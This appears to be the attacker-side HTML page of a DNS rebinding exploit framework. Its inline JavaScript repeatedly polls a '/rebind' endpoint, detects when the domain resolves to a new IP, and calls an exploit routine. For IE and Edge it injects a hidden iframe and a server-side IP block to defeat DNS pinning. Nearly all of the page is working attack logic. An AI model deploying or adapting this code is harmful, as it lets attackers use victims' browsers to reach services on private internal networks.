<html>
<head>
<!-- Some helper functions -->
<script src="a.js"></script>
</head>
<body>
<div id="inject"></div>
<script>
var rootDomain = undefined;	// Will try and detect it dynamically if set to undefined
var sent = 0;				// How many requests have been sent
var max_send = 60;			// Number of requests to send before we give up
var wait_each = 5 * 1000;	// Waiting period between each request

function sendEach(xhr)	{
	console.log(xhr);
	if(sent < max_send)	{
		// The real server should always return HTTP 200
		if(xhr != null)	{
			if(xhr.status != 200)	{
				console.log("Got non-200 response");
				exploitStart();
				return;
			}
			else if(xhr.response != "OK")	{
				console.log("Got unexpected text response");
				exploitStart();
				return;
			}
		}
		sent += 1;
		console.log("Started new timeout: " + sent);
		setTimeout(function () { sendReq("GET", url + "/rebind?browser=" + browser() + "&delay=" + (sent*(wait_each/1000)), null, sendEach); }, wait_each);
	}
	else	{
		console.log("All done");
	}
	return;
}

function triggered(xhr)	{
	console.log("Sent trigger domain: " + document.domain);
	
	// If xhr is null or a non-200 code was returned, we were not successfull,
	// potentially because we are at the wrong IP
	if(xhr == null || xhr.status != 200)	{
		console.log("Failed to trigger on domain");
		return;
	}

	if(browser() == "IE" || browser() == "Edge")	{
		// Insert so that the browser knows the IP is "down"
		var img = "<img src='" + target_URL() + "/test.png'>";
		document.getElementById("inject").innerHTML = img;
		
		// If we are on IE or Edge we trigger new IP more quickly
		wait_each = 1 * 1000;
		sendReq("GET", url + "/rebind?browser=" + browser() + "&delay=0", null, sendEach);
	}
	else	{
		// Start making requests	
		sendEach(null);
	}
}


var url = target_URL();

/**
* Because of the long DNS pinning in IE and Edge, they are handled a bit differently.
* A new iframe is inserted to a second domain that has domain entry to both domains
*/
if(browser() == "IE" || browser() == "Edge")	{
	console.log("Detected IE");
	var domain = document.domain;

	/**
	* Assumes that first domain name is: [random].a.[root domain]
	* Assumes second domain name is: [random].b.[root domain]
	*/
	var ind = domain.indexOf(".b.");
	if(ind > 0)	{
		// Asks the web server to block this IP for 60 seconds
		sendReq("GET", url + "/trigger?block=true&time=60", null, triggered);
	}
	else	{
		if(rootDomain == undefined)	{
			// Assumes everything after the ".a." separater is the root domain that should be used
			var ind2 = domain.indexOf(".a.");
			rootDomain = domain.substring(ind2 + 3);
		}
		var iframe = '<iframe width="0" height="0" src="http://' + rootDomain + '/redirect?sub=b" frameborder="0"></iframe>';
		document.getElementById("inject").innerHTML = iframe;
	}
}
else	{
	sendReq("GET", url + "/trigger", null, triggered);
}
</script>
</body>
</html>
